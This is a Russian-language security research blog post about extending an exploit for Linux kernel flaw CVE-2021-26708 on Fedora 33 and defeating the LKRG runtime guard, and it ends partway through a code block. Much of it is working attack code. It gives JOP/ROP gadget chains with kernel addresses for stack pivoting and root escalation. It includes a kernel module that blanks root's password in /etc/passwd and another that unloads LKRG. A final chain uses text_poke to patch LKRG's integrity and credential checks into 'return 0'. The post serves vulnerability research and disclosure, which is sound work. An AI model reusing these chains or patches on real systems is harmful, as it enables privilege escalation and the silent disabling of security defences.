---
layout: post
title:  "[ru] Исследование защиты LKRG с помощью уязвимости CVE-2021-26708 в ядре Linux"
date:   2021-10-25 13:37:00 +0300
---

В этой статье я расскажу о продолжении моего исследования уязвимости CVE-2021-26708 в ядре Linux. Я доработал свой прототип эксплоита и с помощью него исследовал средство защиты [Linux Kernel Runtime Guard](https://github.com/openwall/lkrg) (LKRG) с позиции атакующего. Я расскажу, как мне удалось найти новый метод обхода защиты LKRG, и как я выполнил ответственное разглашение результатов своего исследования.

Летом я [выступил с докладом](https://zeronights.ru/en/reports-en/improving-the-exploit-for-cve-2021-26708-in-the-linux-kernel-to-bypass-lkrg/) по этой теме на конференции ZeroNights 2021 ([слайды](https://a13xp0p0v.github.io/img/CVE-2021-26708_LKRG_bypass.pdf)):
<div style="position:relative;padding-top:56.25%;">
  <iframe src="https://www.youtube.com/embed/n6YLiYiCIMA" frameborder="0" allowfullscreen
    style="position:absolute;top:0;left:0;width:100%;height:100%;"></iframe>
</div>
<br/>

## Зачем я продолжил исследование

В [первой статье](https://xakep.ru/2021/10/19/linux-core-cve/) я описал прототип эксплоита для локального повышения привилегий на `Fedora 33 Server` для платформы `x86_64`. Я рассказал, как состояние гонки в реализации виртуальных сокетов ядра Linux может привести к повреждению четырех байтов ядерной памяти. Я показал, как атакующий может шаг за шагом превратить эту ошибку в произвольное чтение-запись памяти ядра и повысить свои привилегии в системе. Но этот способ повышения привилегий имеет некоторые ограничения, которые мешали мне экспериментировать в системе под защитой LKRG. Я решил продолжить исследование и выяснить, можно ли их устранить. Сейчас я поясню, в чем было дело.

Мой прототип эксплоита выполнял произвольную запись с помощью перехвата потока управления при вызове деструктора `destructor_arg` в атакованном ядерном объекте `sk_buff`:

<center><img src="/img/skb_payload.png" width="85%"></center>
<br/>

Этот деструктор имеет следующий прототип:

```c
void (*callback)(struct ubuf_info *, bool zerocopy_success);
```

Когда ядро вызывает его в функции [`skb_zcopy_clear()`](https://elixir.bootlin.com/linux/v5.10/source/include/linux/skbuff.h#L1470), регистр `RDI` содержит первый аргумент функции. Это адрес самой структуры `ubuf_info`. А регистр `RSI` хранит `1` в качестве второго аргумента функции.

Содержимое этой структуры `ubuf_info` контролируется эксплоитом. Однако первые восемь байтов в ней должны быть заняты адресом функции-деструктора, как видно на схеме. В этом и есть основное ограничение. Из-за него ROP-гаджет для переключения ядерного стека на контролируемую область памяти (stack pivoting) должен выглядеть примерно так:

```
mov rsp, qword ptr [rdi + 8] ; ret
```

К сожалению, ничего похожего в ядре Fedora `vmlinuz-5.10.11-200.fc33.x86_64` найти не удалось. Но зато с помощью [`ROPgadget`](https://github.com/JonathanSalwan/ROPgadget) я нашел такой гаджет, который удовлетворяет этим ограничениям и выполняет запись ядерной памяти вообще без переключения ядреного стека:

```
mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
```

Как сказано выше, `RDI + 8` — это адрес ядерной памяти, содержимое которой контролирует атакующий. В регистре `RSI` содержится 1, а в `RCX` — 0. То есть этот гаджет записывает семь нулевых байтов и один байт с 1 по адресу, который задает атакующий. Как выполнить повышение привилегий процесса с помощью этого ROP-гаджета? Мой прототип эксплоита записывает 0 в поля `uid`, `gid`, `effective uid` и `effective gid` структуры `cred`.

Мне удалось придумать хоть и странный, но вполне рабочий эксплоит-примитив. При этом я не был полностью удовлетворен этим решением, потому что оно не давало возможности полноценного ROP. Кроме того, приходилось выполнять перехват потока управления дважды, чтобы перезаписать все необходимые поля в `struct cred`. Это делало прототип эксплоита менее надежным. Поэтому я решил немного отдохнуть и продолжить исследование.

## Регистры под контролем атакующего

Первым делом я решил еще раз посмотреть на состояние регистров процессора в момент перехвата потока управления. Я поставил точку останова в функции [`skb_zcopy_clear()`](https://elixir.bootlin.com/linux/v5.10/source/include/linux/skbuff.h#L1470), которая вызывает обработчик `callback` из `destructor_arg`:

```console
$ gdb vmlinux
gdb-peda$ target remote :1234
gdb-peda$ break ./include/linux/skbuff.h:1481
```

Вот что отладчик показывает прямо перед перехватом потока управления:

<center><img src="/img/control_flow_hijack_regs.png" width="100%"></center>
<br/>

Какие ядерные адреса хранятся в регистрах процессора? `RDI` и `R8` содержат адрес `ubuf_info`, о котором было сказано выше. Разыменование этого указателя дает указатель на функцию `callback`, который загружен в регистр `RAX`. В регистре `R9` содержится некоторый указатель на память в ядерном стеке (его значение близко к значению `RSP`). В регистрах `R12` и `R14` находятся какие-то адреса памяти в ядерной куче, и мне не удалось выяснить, на какие объекты они ссылаются.

А вот регистр `RBP`, как оказалось, содержит адрес `skb_shared_info`. Это адрес моего объекта `sk_buff` плюс отступ `SKB_SHINFO_OFFSET`, который равен `3776` или `0xec0` (больше деталей в [первой статье](https://xakep.ru/2021/10/19/linux-core-cve/)). Этот адрес дал мне надежду на успех, потому что он указывает на память, содержимое которой находится под контролем эксплоита. Я начал искать ROP/JOP-гаджеты, задействующие `RBP`.

## Исчезающие JOP-гаджеты

Я стал просматривать все доступные гаджеты с участием `RBP` и нашел множество JOP-гаджетов, похожих на этот:

```
0xffffffff81711d33 : xchg eax, esp ; jmp qword ptr [rbp + 0x48]
```

Адрес `RBP + 0x48` также указывает на ядерную память под контролем атакующего. Я понял, что могу выполнить stack pivoting с помощью **цепочки таких JOP-гаджетов**, после чего выполнить полноценную ROP-цепочку. Отлично!

Для быстрого эксперимента я взял этот гаджет `xchg eax, esp ; jmp qword ptr [rbp + 0x48]`. Он переключает ядерный стек на память в пользовательском пространстве. Сначала я удостоверился, что этот гаджет действительно находится в коде ядра:

```
$ gdb vmlinux

gdb-peda$ disassemble 0xffffffff81711d33
Dump of assembler code for function acpi_idle_lpi_enter:
   0xffffffff81711d30 <+0>:	call   0xffffffff810611c0 <__fentry__>
   0xffffffff81711d35 <+5>:	mov    rcx,QWORD PTR gs:[rip+0x7e915f4b]
   0xffffffff81711d3d <+13>:	test   rcx,rcx
   0xffffffff81711d40 <+16>:	je     0xffffffff81711d5e <acpi_idle_lpi_enter+46>

gdb-peda$ x/2i 0xffffffff81711d33
   0xffffffff81711d33 <acpi_idle_lpi_enter+3>:	xchg   esp,eax
   0xffffffff81711d34 <acpi_idle_lpi_enter+4>:	jmp    QWORD PTR [rbp+0x48]
```

Так и есть. Код функции `acpi_idle_lpi_enter()` начинается с адреса `0xffffffff81711d30`, и гаджет отображается, если смотреть на код этой функции с трехбайтовым отступом.

Однако, когда я попробовал выполнить этот гаджет при перехвате потока управления, ядро неожиданно выдало отказ страницы (page fault). Я стал отлаживать эту ошибку и заодно спросил моего друга [Андрея Коновалова](https://twitter.com/andreyknvl), известного исследователя безопасности Linux, не сталкивался ли он с таким эффектом. Андрей обратил внимание, что байты кода, которые распечатало ядро, отличались от вывода утилиты `objdump` для исполняемого файла ядра.

<center><img src="/img/missing_gadget.png" width="100%"></center>
<br/>

Это был первый случай в моей практике с ядром Linux, когда дамп кода в ядерном журнале оказался полезен :) Я подключился отладчиком к работающему ядру и обнаружил, что код функции `acpi_idle_lpi_enter()` действительно изменился:

```
$ gdb vmlinux
gdb-peda$ target remote :1234

gdb-peda$ disassemble 0xffffffff81711d33
Dump of assembler code for function acpi_idle_lpi_enter:
   0xffffffff81711d30 <+0>:	nop    DWORD PTR [rax+rax*1+0x0]
   0xffffffff81711d35 <+5>:	mov    rcx,QWORD PTR gs:[rip+0x7e915f4b]
   0xffffffff81711d3d <+13>:	test   rcx,rcx
   0xffffffff81711d40 <+16>:	je     0xffffffff81711d5e <acpi_idle_lpi_enter+46>

gdb-peda$ x/2i 0xffffffff81711d33
   0xffffffff81711d33 <acpi_idle_lpi_enter+3>:	add    BYTE PTR [rax],al
   0xffffffff81711d35 <acpi_idle_lpi_enter+5>:	mov    rcx,QWORD PTR gs:[rip+0x7e915f4b]
```

На самом деле, ядро Linux может модифицировать свой собственный код в момент исполнения. В этом конкретном случае код функции `acpi_idle_lpi_enter()` был изменен механизмом [`CONFIG_DYNAMIC_FTRACE`](https://elixir.bootlin.com/linux/v5.10/source/Documentation/trace/ftrace.rst). Он также испортил множество других JOP-гаджетов, на которые я рассчитывал! Чтобы не попасть в такую ситуацию снова, я решил попробовать искать нужные ROP/JOP-гаджеты в памяти ядра живой виртуальной машины.

<center><img src="/img/surgeon.jpg" width="85%">
<br/>Евгений Корнеев. Портрет академика Л. К. Богуша. 1980
</center>
<br/>

Сначала я опробовал команду `ropsearch` из инструмента `gdb-peda`, но у нее оказалась слишком ограниченная функциональность. Тогда я зашел с другой стороны и сделал снимок всей области памяти с ядерным кодом с помощью команды `gdb-peda dumpmem`. В первую очередь нужно было определить расположение ядерного кода в памяти:

```console
[root@localhost ~]# grep "_text" /proc/kallsyms
ffffffff81000000 T _text
[root@localhost ~]# grep "_etext" /proc/kallsyms
ffffffff81e026d7 T _etext
```

Затем я сделал снимок памяти между адресами `_text` и `_etext`:

```console
gdb-peda$ dumpmem kerndump 0xffffffff81000000 0xffffffff81e03000
Dumped 14692352 bytes to 'kerndump'
```

После этого я применил к полученному файлу утилиту [`ROPgadget`](https://github.com/JonathanSalwan/ROPgadget). Она может искать ROP/JOP-гаджеты в сыром снимке памяти, если задать дополнительные опции (спасибо за подсказку моему другу [Максиму Горячему](https://twitter.com/h0t_max), известному исследователю безопасности аппаратного обеспечения):

```console
# ./ROPgadget.py --binary kerndump --rawArch=x86 --rawMode=64 > rop_gadgets_5.10.11_kerndump
```

Теперь я был готов составить JOP/ROP-цепочку.

## JOP/ROP-цепочка для stack pivoting

Я изучил гаджеты с регистром `RBP`, которые остались в памяти живой машины с учетом `CONFIG_DYNAMIC_FTRACE`, и смог составить такую JOP/ROP-цепочку для переключения ядерного стека на контролируемую мной область памяти:

```c
/* JOP/ROP gadget chain for stack pivoting: */

/* mov ecx, esp ; cwde ; jmp qword ptr [rbp + 0x48] */
#define STACK_PIVOT_1_MOV_ECX_ESP_JMP		(0xFFFFFFFF81768A43lu + kaslr_offset)

/* push rdi ; jmp qword ptr [rbp - 0x75] */
#define STACK_PIVOT_2_PUSH_RDI_JMP		(0xFFFFFFFF81B5FD0Alu + kaslr_offset)

/* pop rsp ; pop rbx ; ret */
#define STACK_PIVOT_3_POP_RSP_POP_RBX_RET	(0xFFFFFFFF8165E33Flu + kaslr_offset)
```

1. Первый JOP-гаджет сохраняет младшие 32 бита регистра `RSP` (указатель на стек) в регистре `ECX` и затем совершает прыжок по адресу, указывающему на следующий гаджет. Это действие важно, потому что эксплоит в конце должен будет восстановить исходное значение `RSP`. К сожалению, в образе ядра не нашлось аналогичного гаджета, который сохранил бы значение `RSP` полностью. Тем не менее я нашел способ обойтись его половиной. Про этот трюк будет рассказано далее.

2. Второй JOP-гаджет помещает в ядерный стек адрес `ubuf_info` из регистра `RDI`, после чего также совершает прыжок по адресу, указывающему на следующий гаджет.

3. Наконец, заключительный ROP-гаджет записывает адрес структуры `ubuf_info` в стековый указатель. Затем он выполняет инструкцию `pop rbx`, которая добавляет восемь байтов к значению `RSP`. Тем самым стековый указатель сдвигается с адреса первого JOP-гаджета, который хранится в начале структуры `ubuf_info` (как было описано выше). Теперь в `RSP` содержится адрес начала ROP-цепочки, исполнение которой начнется после инструкции `ret`. Отлично!

Вот как эксплоит готовит эту цепочку в памяти для перезаписи ядерного объекта `sk_buff`:

```c
/* mov ecx, esp ; cwde ; jmp qword ptr [rbp + 0x48] */
uinfo_p->callback = STACK_PIVOT_1_MOV_ECX_ESP_JMP;

unsigned long *jmp_addr_1 = (unsigned long *)(xattr_addr + SKB_SHINFO_OFFSET + 0x48);
/* push rdi ; jmp qword ptr [rbp - 0x75] */
*jmp_addr_1 = STACK_PIVOT_2_PUSH_RDI_JMP;

unsigned long *jmp_addr_2 = (unsigned long *)(xattr_addr + SKB_SHINFO_OFFSET - 0x75);
/* pop rsp ; pop rbx ; ret */
*jmp_addr_2 = STACK_PIVOT_3_POP_RSP_POP_RBX_RET;
```

<center><img src="/img/skb_payload_jop_chain.png" width="100%"></center>
<br/>

## ROP-цепочка для повышения привилегий

После того как я справился с переключением ядерного стека на контролируемую мной область памяти, я быстро собрал ROP-цепочку для повышения привилегий:

```c
unsigned long *rop_gadget = (unsigned long *)(xattr_addr + MY_UINFO_OFFSET + 8);
int i = 0;

#define ROP_POP_RAX_RET			(0xFFFFFFFF81015BF4lu + kaslr_offset)
#define ROP_MOV_QWORD_PTR_RAX_0_RET	(0xFFFFFFFF8112E6D7lu + kaslr_offset)

/* 1. Perform privilege escalation */
rop_gadget[i++] = ROP_POP_RAX_RET;		/* pop rax ; ret */
rop_gadget[i++] = owner_cred + CRED_UID_GID_OFFSET;
rop_gadget[i++] = ROP_MOV_QWORD_PTR_RAX_0_RET;	/* mov qword ptr [rax], 0 ; ret */
rop_gadget[i++] = ROP_POP_RAX_RET;		/* pop rax ; ret */
rop_gadget[i++] = owner_cred + CRED_EUID_EGID_OFFSET;
rop_gadget[i++] = ROP_MOV_QWORD_PTR_RAX_0_RET;	/* mov qword ptr [rax], 0 ; ret */
```

Тут довольно просто. Ядерный адрес `owner_cred` был получен эксплоитом с помощью произвольного чтения ядерной памяти (все подробности в [первой статье](https://xakep.ru/2021/10/19/linux-core-cve/)). Представленная часть ROP-цепочки использует этот адрес, чтобы перезаписать значение `uid`, `gid`, `effective uid` и `effective gid` нулем, что дает привилегии суперпользователя.

Далее ROP-цепочка должна восстановить исходное значение регистра `RSP` и продолжить исполнение системного вызова как ни в чем не бывало. Как у меня получилось это сделать? Младшие 32 бита изначального стекового указателя были сохранены в регистре `RCX`. А старшие 32 бита можно извлечь из значения регистра `R9`, так как в нем хранится некоторый адрес из ядерного стека (это было показано выше на выводе отладчика). Немного битовой арифметики — и готово:

```c
#define ROP_MOV_RAX_R9_RET		(0xFFFFFFFF8106BDA4lu + kaslr_offset)
#define ROP_POP_RDX_RET			(0xFFFFFFFF8105ED4Dlu + kaslr_offset)
#define ROP_AND_RAX_RDX_RET		(0xFFFFFFFF8101AD34lu + kaslr_offset)
#define ROP_ADD_RAX_RCX_RET		(0xFFFFFFFF8102BA35lu + kaslr_offset)
#define ROP_PUSH_RAX_POP_RBX_RET	(0xFFFFFFFF810D64D1lu + kaslr_offset)
#define ROP_PUSH_RBX_POP_RSP_RET	(0xFFFFFFFF810749E9lu + kaslr_offset)

/* 2. Restore RSP and continue */
rop_gadget[i++] = ROP_MOV_RAX_R9_RET;	    /* mov rax, r9 ; ret */
rop_gadget[i++] = ROP_POP_RDX_RET;	    /* pop rdx ; ret */
rop_gadget[i++] = 0xffffffff00000000lu;
rop_gadget[i++] = ROP_AND_RAX_RDX_RET;	    /* and rax, rdx ; ret */
rop_gadget[i++] = ROP_ADD_RAX_RCX_RET;	    /* add rax, rcx ; ret */
rop_gadget[i++] = ROP_PUSH_RAX_POP_RBX_RET; /* push rax ; pop rbx ; ret */
rop_gadget[i++] = ROP_PUSH_RBX_POP_RSP_RET; /* push rbx ; add eax, 0x415d0060 ; pop rsp ; ret*/
```

Здесь значение регистра `R9` копируется в `RAX`. Затем битовая маска `0xffffffff00000000` сохраняется в `RDX`, и побитовая операция `AND` выполняется для `RAX` и `RDX`. В результате `RAX` содержит старшие биты исходного стекового указателя, к которым нужно прибавить младшие биты из `RCX`. Результат загружается в регистр `RSP` через `RBX` (мне пришлось сделать так, потому что в памяти машины не нашлось гаджета типа `mov rsp, rax ; ret`).

Финальная инструкция `RET` возвращает управление из ROP-цепочки. За счет аккуратно восстановленного значения `RSP` ядро продолжает обработку системного вызова `recv()`, однако эксплоит уже выполняется с привилегиями пользователя `root`.

## Проверить LKRG на прочность

[Linux Kernel Runtime Guard](https://github.com/openwall/lkrg) (LKRG) — это очень интересный проект. Он предоставляет ядерный модуль, который в процессе работы системы проверяет целостность ядра и противодействует эксплуатации уязвимостей в нем. [LKRG выявляет ядерные эксплоиты](https://www.openwall.com/presentations/OSTconf2020-LKRG-In-A-Nutshell/) по характерным действиям и повреждению определенных данных. LKRG обнаруживает:

 - несанкционированное повышение привилегий
   - через вызов функции `commit_creds()`
   - или с помощью перезаписи `struct cred`;
 - нарушение изоляции процесса и выход из namespace;
 - несанкционированное изменение состояния процессора (например, отключение `SMEP` и `SMAP` на `x86_64`);
 - неправомерное изменение данных в секциях `.text` и `.rodata` ядра Linux;
 - выполнение приемов stack pivoting и ROP;
 - и еще многое другое.

<center><img src="/img/lkrg.png" width="40%"></center>
<br/>

Этот проект [поддерживается](https://lkrg.org/) компанией Openwall. Основной разработчик — [Адам 'pi3' Заброцки](https://twitter.com/Adam_pi3), который занимается проектом в свободное время. В данный момент LKRG поставляется в бета-версии, при этом разработчики стараются поддерживать высокую надежность и портируемость между различными версиями ядра. Вот что Адам говорит о проекте:

```
We are aware that LKRG is bypassable by design (as we have always spoken openly)
but such bypasses are neither easy nor cheap/reliable.
```

Перевожу это так:

```
Мы знаем, что защиту LKRG можно обойти (о чем мы всегда открыто говорили),
однако эти методы обхода непростые, недешевые и ненадежные.

```

[Илья Матвейчиков](https://github.com/milabs), известный эксперт по руткитам, уже проводил исследования в этой области. Он собрал результаты своих экспериментов в [отдельном репозитории](https://github.com/milabs/lkrg-bypass). В ответ Адам проанализировал работу Ильи и [улучшил LKRG](https://www.openwall.com/lists/lkrg-users/2019/02/21/2), чтобы устранить эти методы обхода защиты.

Я решил доработать мой улучшенный прототип эксплоита для [CVE-2021-26708](https://nvd.nist.gov/vuln/detail/CVE-2021-26708) и придумать новый способ обхода LKRG. Стало еще интереснее. Моя первая идея была такая:

```shell
LKRG отслеживает несанкционированное повышение привилегий,
но при этом не следит за содержимым файла '/etc/passwd'.
Значит, я могу попробовать незаметно сбросить пароль пользователя root
через изменение '/etc/passwd'! Выполнение команды 'su' после этого
будет выглядеть для LKRG абсолютно легально.
```

Я сделал быстрый прототип для этой идеи. Удобно было оформить его в виде небольшого модуля ядра:

```c
#include <linux/module.h>
#include <linux/kallsyms.h>

static int __init pwdhack_init(void)
{
	struct file *f = NULL;
	char *str = "root::0:0:root:/root:/bin/bash\n";
	ssize_t wret;
	loff_t pos = 0;

	pr_notice("pwdhack: init\n");

	f = filp_open("/etc/passwd", O_WRONLY, 0);
	if (IS_ERR(f)) {
		pr_err("pwdhack: filp_open() failed\n");
		return -ENOENT;
	}

	wret = kernel_write(f, str, strlen(str), &pos);
	printk("pwdhack: kernel_write() returned %ld\n", wret);

	pr_notice("pwdhack: done\n");

	return 0;
}

static void __exit pwdhack_exit(void)
{
	pr_notice("pwdhack: exit\n");
}

module_init(pwdhack_init)
module_exit(pwdhack_exit)

MODULE_LICENSE("GPL v2");
```

Этот ядерный код перезаписывает начало файла `/etc/passwd` строкой `root::0:0:root:/root:/bin/bash\n` и тем самым устанавливает пустой пароль для пользователя `root`. После этого непривилегированный пользователь может выполнить команду `su` и беспрепятственно получить привилегии суперпользователя.

Далее я реализовал в своей ROP-цепочке такую логику с вызовом функций `filp_open()` и `kernel_write()`, но эксплоит не смог открыть файл `/etc/passwd`. Оказывается, ядро проверяет привилегии процесса и правила политики SELinux, даже когда файл открывается из пространства ядра. Перезапись привилегий **перед** `filp_open()` тоже не сработала: LKRG сразу же обнаружил это и убил процесс эксплоита. Таким образом, эту идею пришлось отбросить.

## Вперед, в атаку на LKRG!

Размышляя об LKRG с позиции атакующего, я осознал, что не нужно от него прятаться. Напротив, мне пришла идея как-то уничтожить LKRG прямо из ROP-цепочки.

<center><img src="/img/snowballs.jpg" width="85%">
<br/>Анатолий Волков. Снежки. 1957
</center>
<br/>

Самый прямой путь к этой цели — просто выгрузить LKRG из ядра. Я написал небольшой модуль ядра, чтобы проверить эту гипотезу перед тем, как перерабатывать ROP-цепочку в эксплоите:

```c
#include <linux/module.h>
#include <linux/kallsyms.h>

static int __init destroy_lkrg_init(void)
{
	struct module *lkrg_mod = find_module("p_lkrg");

	if (!lkrg_mod) {
		pr_notice("destroy_lkrg: p_lkrg module is NOT found\n");
		return -ENOENT;
	}

	if (!lkrg_mod->exit) {
		pr_notice("destroy_lkrg: p_lkrg module has no exit method\n");
		return -ENOENT;
	}

	pr_notice("destroy_lkrg: p_lkrg module is found, remove it brutally!\n");
	lkrg_mod->exit();

	return 0;
}

static void __exit destroy_lkrg_exit(void)
{
	pr_notice("destroy_lkrg: exit\n");
}

module_init(destroy_lkrg_init)
module_exit(destroy_lkrg_exit)

MODULE_LICENSE("GPL v2");
```

Эксперимент показал, что это рабочая идея, модуль LKRG был выгружен. Тогда я реализовал в моей ROP-цепочке эту логику с вызовом функций `find_module()` и `exit()` из LKRG, но она не сработала. Почему? В функции `p_lkrg_deregister()` в процессе своей выгрузки LKRG вызывает ядерную функцию `schedule()`, в которой у него поставлена дополнительная проверка `pCFI` (LKRG вставляет такие проверки во многие важные точки ядра Linux). Эта проверка обнаруживает мою ROP-цепочку и убивает процесс эксплоита прямо в процессе выгрузки модуля LKRG. К тому же система при этом зависает. Жаль, хорошая была идея.

Тогда я стал думать, как еще можно вывести LKRG из строя, и обратил внимание на `kprobes` и `kretprobes`. Это как раз тот механизм, с помощью которого LKRG расставляет свои проверки по всему ядру  Linux. Первым делом я попробовал просто выключить `kprobes` через штатную настройку в `debugfs`:

```console
[root@localhost ~]# echo 0 > /sys/kernel/debug/kprobes/enabled
```

На системе без LKRG это сработало корректно, но когда я попробовал сделать это с загруженным LKRG, система полностью зависла. Мне кажется, в этом случае где-то в ядре из-за LKRG происходит взаимная блокировка (deadlock) или бесконечный цикл. Как бы то ни было, я не стал тратить дополнительное время на отладку этой ошибки.

Кстати, отладка ядра с LKRG — это то еще удовольствие. Например, я долго не мог понять, почему ядро Linux с LKRG падает (crash) каждый раз, когда я пытаюсь поработать в отладчике. Дело в том, что при задании точки останова `gdb` меняет инструкцию в коде ядра, а LKRG в параллельном потоке через некоторое время обнаруживает это как «ошибку целостности» и убивает всю машину, пока я таращусь в отладчик, пытаясь понять, что к чему :)

## Успешная атака на LKRG

Наконец мне удалось придумать рабочую атаку против LKRG. Я стал разбираться в его коде и нашел две функции, которые отвечают за главную функциональность. Это `p_check_integrity()`, которая выполняет проверку целостности кода ядра, и `p_cmp_creds()`, которая сверяет привилегии процессов системы с внутренней базой LKRG и обнаруживает несанкционированное повышение привилегий.

Мне пришла идея атаковать в лоб и переписать код этих двух функций прямо из ROP-цепочки в эксплоите. Я сделал это с помощью байтов `0x48 0x31 0xc0 0xc3`, которые представляют собой инструкции `xor rax, rax ; ret`, то есть `return 0`. После этого я беспрепятственно поднял привилегии процесса эксплоита. Отлично! Разберем получившуюся финальную ROP-цепочку:

```c
unsigned long *rop_gadget = (unsigned long *)(xattr_addr + MY_UINFO_OFFSET + 8);
int i = 0;

#define SAVED_RSP_OFFSET	3400

#define ROP_MOV_RAX_R9_RET		(0xFFFFFFFF8106BDA4lu + kaslr_offset)
#define ROP_POP_RDX_RET			(0xFFFFFFFF8105ED4Dlu + kaslr_offset)
#define ROP_AND_RAX_RDX_RET		(0xFFFFFFFF8101AD34lu + kaslr_offset)
#define ROP_ADD_RAX_RCX_RET		(0xFFFFFFFF8102BA35lu + kaslr_offset)
#define ROP_MOV_RDX_RAX_RET		(0xFFFFFFFF81999A1Dlu + kaslr_offset)
#define ROP_POP_RAX_RET			(0xFFFFFFFF81015BF4lu + kaslr_offset)
#define ROP_MOV_QWORD_PTR_RAX_RDX_RET	(0xFFFFFFFF81B6CB17lu + kaslr_offset)

/* 1. Save RSP */
rop_gadget[i++] = ROP_MOV_RAX_R9_RET;	/* mov rax, r9 ; ret */
rop_gadget[i++] = ROP_POP_RDX_RET;	/* pop rdx ; ret */
rop_gadget[i++] = 0xffffffff00000000lu;
rop_gadget[i++] = ROP_AND_RAX_RDX_RET;	/* and rax, rdx ; ret */
rop_gadget[i++] = ROP_ADD_RAX_RCX_RET;	/* add rax, rcx ; ret */
rop_gadget[i++] = ROP_MOV_RDX_RAX_RET;	/* mov rdx, rax ; shr rax, 0x20 ; xor eax, edx ; ret */
rop_gadget[i++] = ROP_POP_RAX_RET;	/* pop rax ; ret */
rop_gadget[i++] = uaf_write_value + SAVED_RSP_OFFSET;
rop_gadget[i++] = ROP_MOV_QWORD_PTR_RAX_RDX_RET; /* mov qword ptr [rax], rdx ; ret */
```

Эта часть ROP-цепочки восстанавливает начальное значение `RSP` из битов в `ECX` и `R9` (методику я описывал выше). Это значение стекового указателя сохраняется в ядерном объекте `sk_buff` (он под контролем атакующего) по отступу `SAVED_RSP_OFFSET`. Эта хитрость позволяет не занимать под хранение значения отдельный регистр, он еще пригодится.

```c
#define KALLSYMS_LOOKUP_NAME 	(0xffffffff81183dc0lu + kaslr_offset)
#define FUNCNAME_OFFSET_1	3550

#define ROP_POP_RDI_RET				(0xFFFFFFFF81004652lu + kaslr_offset)
#define ROP_JMP_RAX				(0xFFFFFFFF81000087lu + kaslr_offset)

/* 2. Destroy lkrg : part 1 */
rop_gadget[i++] = ROP_POP_RAX_RET;	/* pop rax ; ret */
rop_gadget[i++] = KALLSYMS_LOOKUP_NAME;
		  /* unsigned long kallsyms_lookup_name(const char *name) */
rop_gadget[i++] = ROP_POP_RDI_RET;	/* pop rdi ; ret */
rop_gadget[i++] = uaf_write_value + FUNCNAME_OFFSET_1;
strncpy((char *)xattr_addr + FUNCNAME_OFFSET_1, "p_cmp_creds", 12);
rop_gadget[i++] = ROP_JMP_RAX;		/* jmp rax */
```

Эта часть ROP-цепочки вызывает функцию `kallsyms_lookup_name("p_cmp_creds")`. В ядерном объекте `sk_buff` по отступу `FUNCNAME_OFFSET_1` подготавливается строка `"p_cmp_creds"`. Ее адрес загружается в регистр `RDI`, через который должен передаваться первый аргумент функции в соответствии с System V AMD64 ABI.

Важно заметить, что опция `lkrg.hide` по умолчанию имеет значение 0, что позволяет атакующему легко получить адреса функций LKRG с помощью вызова `kallsyms_lookup_name()`. Также есть и другие способы сделать это.

```c
#define XOR_RAX_RAX_RET				(0xFFFFFFFF810859C0lu + kaslr_offset)
#define ROP_TEST_RAX_RAX_CMOVE_RAX_RDX_RET	(0xFFFFFFFF81196AA2lu + kaslr_offset)

/* If lkrg function is not found, let's patch "xor rax, rax ; ret" */
rop_gadget[i++] = ROP_POP_RDX_RET;	/* pop rdx ; ret */
rop_gadget[i++] = XOR_RAX_RAX_RET;
rop_gadget[i++] = ROP_TEST_RAX_RAX_CMOVE_RAX_RDX_RET; /* test rax, rax ; cmove rax, rdx ; ret*/
```

В этой части ROP-цепочки идет обработка результата вызова `kallsyms_lookup_name()`. Эта функция через регистр `RAX` возвращает адрес `p_cmp_creds()` или `NULL`, если модуль LKRG не загружен. Эксплоит должен корректно обрабатывать оба этих случая, и я придумал для этого такой трюк:
  1. Я нашел в ядерной памяти живой машины байты инструкций `xor rax, rax ; ret`, их адрес здесь определен как `XOR_RAX_RAX_RET`.
  2. Этот адрес загружается в регистр `RDX`.
  3. Если `kallsyms_lookup_name("p_cmp_creds")` возвращает `NULL`, то этот адрес загружается в регистр `RAX` вместо `NULL`. Для этого используется инструкция conditional move в гаджете `test rax, rax ; cmove rax, rdx ; ret`.

Отлично! Если модуль LKRG загружен в ядро, эксплоит перепишет код функции `p_cmp_creds()` инструкциями `xor rax, rax ; ret`. В противном случае, если LKRG отсутствует, эксплоит перепишет инструкции `xor rax, rax ; ret` теми же самыми байтами и ничего не испортит в ядерной памяти. Эта перезапись (patching) выполняется в следующей части ROP-цепочки:

```c
#define TEXT_POKE		(0xffffffff81031300lu + kaslr_offset)
#define CODE_PATCH_OFFSET	3450

#define ROP_MOV_RDI_RAX_POP_RBX_RET		(0xFFFFFFFF81020ABDlu + kaslr_offset)
#define ROP_POP_RSI_RET				(0xFFFFFFFF810006A4lu + kaslr_offset)

rop_gadget[i++] = ROP_MOV_RDI_RAX_POP_RBX_RET;
		  /* mov rdi, rax ; mov eax, ebx ; pop rbx ; or rax, rdi ; ret */
rop_gadget[i++] = 0x1337;	   /* dummy value for RBX */
rop_gadget[i++] = ROP_POP_RSI_RET; /* pop rsi ; ret */
rop_gadget[i++] = uaf_write_value + CODE_PATCH_OFFSET;
strncpy((char *)xattr_addr + CODE_PATCH_OFFSET, "\x48\x31\xc0\xc3", 5);
rop_gadget[i++] = ROP_POP_RDX_RET; /* pop rdx ; ret */
rop_gadget[i++] = 4;
rop_gadget[i++] = ROP_POP_RAX_RET; /* pop rax ; ret */
rop_gadget[i++] = TEXT_POKE;
		  /* void *text_poke(void *addr, const void *opcode, size_t len) */
rop_gadget[i++] = ROP_JMP_RAX;	   /* jmp rax */
```

Здесь эксплоит подготавливает в регистрах аргументы для вызова функции `text_poke()`, которая и выполнит перезапись ядерного кода:
  1. Адрес цели для перезаписи копируется из `RAX` в `RDI`. Это будет первый аргумент функции. К сожалению, мне не удалось найти меньший гаджет, который сделает это копирование, поэтому здесь на стеке подготовлены дополнительные байты для лишней инструкции `pop rbx` из первого гаджета.
  2. В объекте `sk_buff` по отступу `CODE_PATCH_OFFSET` подготавливается полезная нагрузка `0x48 0x31 0xc0 0xc3` для перезаписи кода. Ее адрес сохраняется в регистр `RSI` в качестве второго аргумента функции.
  3. Третий аргумент функции `text_poke()` — это длина данных для перезаписи. Он передается через регистр `RDX` и имеет значение 4.

Ядерная функция [`text_poke()`](https://elixir.bootlin.com/linux/v5.10/source/arch/x86/kernel/alternative.c#L959) — это штатная функциональность, с помощью которой ядро может изменять свой собственный код в динамике, во время работы. Эта функция на краткое время делает отображение нужного кода доступным для записи и выполняет `memcpy()`. Данной функциональностью как раз пользуется `kprobes` и другие механизмы ядра Linux.

Описанная процедура с `kallsyms_lookup_name()`, `cmove` и `text_poke()` затем выполняется для перезаписи функции `p_check_integrity()` из модуля LKRG. Тем самым эксплоит устраняет защиту LKRG, делая его полностью беспомощным. Теперь можно беспрепятственно повысить привилегии процесса (это уже было описано выше):

```c
